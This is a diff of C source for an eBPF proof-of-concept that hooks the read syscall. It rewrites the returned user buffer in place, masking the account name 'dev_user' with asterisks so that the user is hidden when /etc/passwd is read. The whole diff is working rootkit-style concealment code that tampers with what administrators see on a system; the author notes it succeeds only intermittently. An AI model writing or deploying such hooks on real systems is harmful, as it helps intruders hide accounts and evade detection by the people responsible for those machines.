@@ -1,5 +1,12 @@
 /**
- * POC : trying to hook read returns based on dedicated files.
+ * POC : trying to hook read returns based on dedicated files & overwrite values.
+ * 
+ * 
+ * WARNING : 
+ * 
+ * Working not every time. I think it's a cache problem when passing through all 4 events.... I have to debug this....
+ * ********:x:1111:1111::/home/********:/bin/bash
+ * dev_user:x:1111:1111::/home/dev_user:/bin/bash
  * 
  * @author Yekuuun
  */
@@ -16,37 +23,121 @@
 #include "../data/bpf_ringbuf.h"
 #include "../lib/ftlib.h"
 
+#define NEEDLE  "dev_user"
+#define NLEN    (sizeof(NEEDLE) - 1)
+#define OVERLAP (NLEN - 1)
+
+
+//----------------------------------------------------
+// ┌────────────────────────────────────┐
+//  INNER CONTEXTS
+// └────────────────────────────────────┘
+//----------------------------------------------------
+
 typedef struct read_loop_ctx {
     unsigned long read;
     char *ubuff;
     __u32 count;
 } read_loop_ctx;
 
+typedef struct scan_ctx {
+	const char *buff;
+	char *ubuff; 
+	unsigned long uread; 
+	__u32 to_read;
+	__u32 matches; 
+} scan_ctx;
+
+/**
+ * Raw byte scanner to find matching.
+ */
+static long __scan_byte(__u32 i, void *data)
+{
+	struct scan_ctx *sctx = (struct scan_ctx *)data;
+
+	if (i + NLEN > sctx->to_read)
+		return 1; /* fin de ce chunk */
+
+	bool match = true;
+
+	#pragma unroll
+	for (__u32 j = 0; j < NLEN; j++) {
+		__u32 idx = (i + j) & (BUFF_READ - 1);
+		if (sctx->buff[idx] != NEEDLE[j]) {
+			match = false;
+			break;
+		}
+	}
+
+	if (match) {
+		const char mask[] = "********";
+		#pragma unroll
+		for (__u32 m = 0; m < NLEN; m++) {
+			char val = mask[m];
+			bpf_probe_write_user(sctx->ubuff + sctx->uread + i + m, &val, 1);
+		}
+
+		sctx->matches++;
+	}
+
+	return 0;
+}
+
 /**
  * Main callback called by bpf_loop() when iterating througt the __user *buffer
  */
+#define OVERLAP (NLEN - 1)
+
 static long __read_user_buffer(__u32 index, void *data)
 {
-    struct read_loop_ctx *lctx = (struct read_loop_ctx*)data;
-    if(!lctx)
-        return 1;
+	struct read_loop_ctx *lctx = (struct read_loop_ctx *)data;
+	if (!lctx)
+		return 1;
 
-    if(lctx->read >= lctx->count){
-        PRINT_DEBUG("End of buff read.");
-        return 1;
-    }
+	if (lctx->read >= lctx->count) {
+		PRINT_DEBUG(" End of buff read.");
+		return 1;
+	}
 
-    char buff[BUFF_READ] = {0};
-    if(bpf_probe_read_user(buff, sizeof(buff), lctx->ubuff) < 0){
-        PRINT_DEBUG("Error reading buffer");
-        return 1;
-    }
+	char buff[BUFF_READ] = {0};
 
-    //PRINT_DEBUG("  Current read : %ld", lctx->read);
+	__u32 to_read = (__u32)lctx->count - lctx->read;
+	if (to_read > BUFF_READ)
+		to_read = BUFF_READ;
 
-    lctx->read += BUFF_READ;
-    return 0;
+	if (bpf_probe_read_user(buff, to_read, lctx->ubuff + lctx->read) < 0) {
+		PRINT_DEBUG("Error reading buffer at offset %lu\n", lctx->read);
+		return 1;
+	}
+
+	struct scan_ctx sctx = {
+		.buff = buff,
+		.ubuff = lctx->ubuff,
+		.uread = lctx->read,
+		.to_read = to_read,
+		.matches = 0,
+	};
+
+	bpf_loop(to_read, __scan_byte, &sctx, 0);
+
+	if (sctx.matches > 0) {
+		send_event(EVENT_TRIGGERED, "__x64_sys_read", "hook cat /etc/passwd & overwrite dev_user");
+	}
+
+	if (to_read == BUFF_READ && to_read > OVERLAP)
+		lctx->read += (to_read - OVERLAP);
+	else
+		lctx->read += to_read;
+
+	return 0;
 }
+
+//----------------------------------------------------
+// ┌────────────────────────────────────┐
+//  SYSCALL HOOKS
+// └────────────────────────────────────┘
+//----------------------------------------------------
+
 
 /**
  * Hook sys_enter_read.
@@ -131,8 +222,12 @@ int tp_sys_exit_read(struct sys_exit_read_ctx *ctx)
         goto __END;
     }
 
+    long actual_read = ctx->ret;
+    if (actual_read <= 0)
+        goto __END;
+
     struct read_loop_ctx lctx = {
-        .count = cache->count,
+        .count = (__u32)actual_read,
         .read  = 0,
         .ubuff = cache->ubuff_adr
     };
